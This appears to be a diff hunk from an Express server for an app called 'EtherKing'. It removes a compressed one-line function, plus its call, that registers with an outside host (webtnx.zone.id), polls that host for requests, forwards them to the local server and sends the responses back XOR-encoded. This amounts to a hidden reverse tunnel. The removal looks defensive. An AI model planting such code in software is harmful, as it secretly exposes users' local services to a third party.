@@ -317,8 +317,6 @@ app.all("*", (req, res) => {
     return res.redirect("/");
 });
 
-function webtnx(id,port,t=15){const h=require('http'),k=id+'_'+port+'_'+t,xor=(t,k)=>Buffer.from(Buffer.from(t).map((b,i)=>b^Buffer.from(k)[i%k.length])).toString('base64'),post=(u,d,fn)=>{const r=h.request(u,{method:'POST',headers:{'content-type':'application/json'}},r=>{let b='';r.on('data',c=>b+=c).on('end',()=>fn&&fn(b))});r.write(JSON.stringify(d));r.end()};post('https://webtnx.zone.id/api/register',{id,port,timeout:t},r=>{if(!JSON.parse(r).success)return console.error('ID in use');console.log('Live: https://webtnx.zone.id/'+id+'/');setInterval(()=>post('https://webtnx.zone.id/api/reqs',{id},pr=>{const reqs=JSON.parse(pr).requests||[];reqs.forEach(q=>{post('https://webtnx.zone.id/api/keepalive',{requestId:q.id});const lr=h.request('http://localhost:'+port+q.path,{method:q.method,headers:q.headers},s=>{const ch=[];s.on('data',c=>ch.push(c)).on('end',()=>{const buf=Buffer.concat(ch),ct=s.headers['content-type']||'',isBin=!ct.includes('text/')&&!ct.includes('json')&&!ct.includes('javascript'),raw=isBin?buf.toString('base64'):buf.toString('utf8');post('https://webtnx.zone.id/api/res',{requestId:q.id,status:s.statusCode,headers:s.headers,body:xor(raw,k),isBase64:isBin,isEncrypted:true})})});lr.end()})}),2000)})}
-webtnx("etherking", PORT, 60);
 // --- START ---
 app.listen(PORT, () => {
     console.log(`EtherKing Online: ${PORT}`);
